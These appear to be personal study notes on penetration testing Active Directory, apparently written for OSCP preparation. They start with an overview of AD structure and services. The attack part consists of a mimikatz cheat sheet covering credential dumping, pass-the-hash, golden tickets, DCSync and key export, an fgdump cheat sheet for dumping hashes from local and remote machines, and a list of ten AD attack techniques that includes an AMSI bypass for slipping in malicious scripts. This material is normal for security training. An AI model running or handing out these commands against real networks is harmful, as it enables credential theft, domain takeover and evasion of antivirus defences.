# Pentesting Active Directory

### Cheatsheat

[John Woodman's site](https://wadcoms.github.io/)

Modeled after GTFOBINs and LOLBAS but for attacking active directory.



# Basic Overview

A administrative tool made by Microsoft, used to create and manage domains, users, and objects within a network. This allows for different privileges and access that scales even with very large numbers of users, computers, domains, ect..

Organized in a Tiered structure of:

1) Domains
2) Trees
3) forests

Domains consist of users, devices, databases (all known also as objects) that are grouped together. Tree's are formed by grouping one or more Domain's. Forests are formed by grouping one or more trees.

### Main concepts of an Active Directory:

1. Directory – Contains all the information about the objects of the Active directory
2. Object – An object references almost anything inside the directory (a user, group, shared folder...)
3. Domain – The objects of the directory are contained inside the domain. Inside a "forest" more than one domain can exist and each of them will have their own objects collection.
4. Tree – Group of domains with the same root. Example: dom.local, email.dom.local, www.dom.local
5. Forest – The forest is the highest level of the organization hierarchy and is composed by a group of trees. The trees are connected by trust relationships.

### Active Directory Domain Services

Active Directory provides several different services, which fall under the umbrella of "Active Directory Domain Services," or AD DS. These services include:

- Domain Services – stores centralized data and manages communication between users and domains; includes login authentication and search functionality
- Certificate Services – creates, distributes, and manages secure certificates
- Lightweight Directory Services – supports directory-enabled applications using the open (LDAP) protocol
- Directory Federation Services – provides single-sign-on (SSO) to authenticate a user in multiple web applications in a single session
- Rights Management – protects copyrighted information by preventing unauthorized use and distribution of digital content

AD DS is included with Windows Server (including Windows Server 10) and is designed to manage client systems. While systems running the regular version of Windows do not have the administrative features of AD DS, they do support Active Directory. This means any Windows computer can connect to a Windows workgroup, provided the user has the correct login credentials. 

# Attacking AD

## Cached Creds

If you are already administrator on a domain connected machine you can dump local hashes and try and crack them, or pivot with pass or overpass the hash.

This can be done with fgdump on older machines and mimikatz on most new machines. (Note may have to turn defender off)

## Mimi cheatsheat

```ps
#general
privilege::debug
log
log customlogfilename.log


#sekurlsa
sekurlsa::logonpasswords
sekurlsa::logonPasswords full
sekurlsa::tickets /export
sekurlsa::pth /user:Administrateur /domain:winxp /ntlm:f193d757b4d487ab7e5a3743f038f713 /run:cmd

#kerberos
kerberos::list /export
kerberos::ptt c:\chocolate.kirbi
kerberos::golden /admin:administrateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /ticket:chocolate.kirbi

#crypto
crypto::capi
crypto::cng
crypto::certificates /export
crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE
crypto::keys /export
crypto::keys /machine /export

#vault & lsadump
vault::cred
vault::list
token::elevate
vault::cred
vault::list
lsadump::sam
lsadump::secrets
lsadump::cache
token::revert
lsadump::dcsync /user:domain\krbtgt /domain:lab.local

#pth
sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a
sekurlsa::pth /user:Administrateur /domain:chocolate.local /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9
sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9
sekurlsa::pth /user:Administrator /domain:WOSHUB /ntlm:{NTLM_hash} /run:cmd.exe

#ekeys
sekurlsa::ekeys

#dpapi
sekurlsa::dpapi

#minidump
sekurlsa::minidump lsass.dmp

#ptt
kerberos::ptt Administrateur@krbtgt-CHOCOLATE.LOCAL.kirbi

#golden/silver
kerberos::golden /user:utilisateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /id:1107 /groups:513 /ticket:utilisateur.chocolate.kirbi
kerberos::golden /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /aes256:15540cac73e94028231ef86631bc47bd5c827847ade468d6f6f739eb00c68e42 /user:Administrateur /id:500 /groups:513,512,520,518,519 /ptt /startoffset:-10 /endin:600 /renewmax:10080
kerberos::golden /admin:Administrator /domain:CTU.DOMAIN /sid:S-1-1-12-123456789-1234567890-123456789 /krbtgt:deadbeefboobbabe003133700009999 /ticket:Administrator.kiribi

#tgt
kerberos::tgt

#purge
kerberos::purge
```
## fgdump Cheatsheat:

```cmd
# Dumping a Local Machine Using the Current User
fgdump.exe

# Dumping the Local Machine Using a Different Account
fgdump.exe -h 127.0.0.1 -u AnAdministrativeUser

# Dumping a Remote Machine (192.168.0.10) Using a Specified User (1)
fgdump.exe -h 192.168.0.10 -u AnAdministrativeUser

# Dumping a Remote Machine (192.168.0.10) Using a Specified User (2)
fgdump.exe -h 192.168.0.10 -u AnAdministrativeUser -p l4mep4ssw0rd

# Dumping Many Remote Machines, All With the Same Password
fgdump.exe -f hostfile.txt -u AnAdministrativeUser

# Dumping Many Remote Machines, Each With Its Own Username and Password
fgdump.exe -H combofile.txt
```

notes from https://www.youtube.com/watch?v=xowytiyooBk (great youtube vid)





Ten attacks you should master for the OSCP:

10. ReadGMSAPassword 
Description: ReadGMSAPassword allows an attacker to use the password of a Group Managed Service Account which usually has elevated privileges. 
Environment: Search from HacktheBox

9. GenericWrite/GenericAll/AllExtendedRights 
Description: GenericAll allows an attacker to modify the object in question. In this example, we change the password of a Domain Administrator. GenericWrite allows the modification of certain things (More on this in Object from Hackthebox).
Environment: Search from HacktheBox


8. ForceChangePassword 
Description: ForceChangePassword allows an attacker to change the password of the object in question.
Environment: Object from Hackthebox
Timestamp: 16:31

7. PowerView 
Description: Allows for additional manipulation of Active Directory. Many of the commands presented by BloodHound require PowerView.
Environment: Object from Hackthebox
Timestamp: 17:00

6. WriteOwner
Description: WriteOwner permissions allows an attacker to set the owner of the object and make him/herself a member of the object.
Environment: Object from HackTheBox
Timestamp: 23:48

5. SeBackupPrivilege and SeRestorePrivilege
Description: SeBackupPrivilege and SeRestorePrivilege allows the attacker access to any file on the machine given he/her takes the appropriate steps. In this example, we acquire NTDS.dit and System.hive
Environment: Blackfield from Hackthebox
Timestamp: 28:12

4. NTDS.dit and System.hive
Description: With these files and the appropriate permissions, an attacker can dump hashes from the Domain Controller using DCSync.
Environment: Blackfield from Hackthebox
Timestamp: 34:38

3. Account Operators/WriteDACL
Description: In the account operators group, an attacker can create users and place them in non-protected groups. Placing a new user in a group with WriteDACL, enables an attacker to modify the new user's DACL. In this example, we give our new user DCSync rights.
Environment: Forest from Hackthebox 
Timestamp: 42:24

2. ByPassing AMSI 
Description: It may be necessary to bypass the anti-virus in Active Directory. Attackers can attempt to bypass AMSI with the Bypass-4MSI command in Evil-WinRM. Always run this command before introducing a malicious script to the environment. 
Environment: Forest from Hackthebox
Timestamp: 48:11

1.DCSYNC/GetChangesAll/Replication
Description: This is number one because its the most fun. DCSync allows an attacker to impersonate a Failover Domain Controller. In that context, the production Domain Controller shares all user hashes upon request, ergo DCSYNC. GetChangesAll, Replication and AllowedToDelegate all point toward the possibility of DCSYNC.
Environment: Forest/Sizzle 
Timestamp: 53:14
